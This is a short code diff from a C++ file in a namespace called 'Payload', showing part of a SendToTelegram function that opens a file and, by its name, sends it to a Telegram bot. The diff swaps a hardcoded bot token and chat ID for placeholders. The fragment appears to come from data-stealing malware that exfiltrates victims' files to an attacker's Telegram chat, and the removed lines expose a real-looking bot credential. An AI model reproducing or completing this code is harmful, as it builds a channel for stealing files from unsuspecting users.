@@ -180,8 +180,8 @@ namespace Payload {
         }
     }
 static void SendToTelegram(const std::filesystem::path& filePath) {
-    std::string token = "8515562419:AAHxH4DFLRjALGstuM3S5sJbLqVqc3OxcG4";
-    std::string chatId = "8362360513";
+    std::string token = "YOUR_BOT_TOKEN";
+    std::string chatId = "CHAT_ID";
 
     std::ifstream file(filePath, std::ios::binary);
     if (!file) return;
